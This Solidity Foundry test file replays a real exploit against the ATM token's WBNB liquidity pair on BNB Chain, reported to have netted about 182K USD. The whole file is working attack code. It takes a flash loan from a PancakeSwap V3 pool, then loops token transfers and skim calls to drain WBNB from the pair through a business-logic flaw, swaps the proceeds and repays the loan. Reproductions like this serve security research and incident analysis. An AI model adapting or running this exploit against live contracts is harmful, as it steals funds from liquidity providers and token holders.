// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a?line=2
// GUY : https://twitter.com/0xNickLFranklin/status/1775008489569718508
// Profit : ~182K USD
// REASON : Business Logic Flaw
// Sandwitch attack,the contract will exchange token -> WBNB & WBNB -> USDT,So use transfer / skim to 

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7); 
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);
    uint256 constant PRECISION = 10**18;
    address test_contract = address(this);
    address hack_contract ;
    uint256 borrow_amount ;
    function setUp() external {
        cheats.createSelectFork("bsc", 37483300);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", WBNB.balanceOf(address(this)), 18);
        borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
        pool.flash(address(this),0,borrow_amount,"");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        console.log(WBNB.balanceOf(address(this)));
        uint256 i = 0;
        uint256 j = 0;
        swap_token_to_token(address(WBNB),address(USDT),WBNB.balanceOf(address(this)) - 170 ether);
        while(j<2){
            swap_token_to_token(address(WBNB),address(ATM),70 ether);
            while(i<100){
                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
                ATM.transfer(address(wbnb_atm),ATM.balanceOf(address(this)));
                wbnb_atm.skim(address(this));
                (,uint wbnb_r,) = wbnb_atm.getReserves();
                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
                console.log("Pair lost:",pair_lost);
                if (pair_lost == 7){
                    break;
                }
                i ++;
            }
            j ++;
        }
        // To get max profit,not good at math so just copy the exploiter's work
        i =0;
        while(i<15){
                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
                ATM.transfer(address(wbnb_atm),ATM.balanceOf(address(this)));
                wbnb_atm.skim(address(this));
                (,uint wbnb_r,) = wbnb_atm.getReserves();
                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
                console.log("Pair lost:",pair_lost,"BNB");
                if (pair_lost == 0){
                    break;
                }
                i ++;
            }
        swap_token_to_token(address(ATM),address(WBNB),ATM.balanceOf(address(this)));
        swap_token_to_token(address(USDT),address(WBNB),USDT.balanceOf(address(this)));
        console.log('My wbnb',WBNB.balanceOf(address(this)));
        WBNB.transfer(address(pool),borrow_amount * 10_000 / 9975 + 1000);
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

}

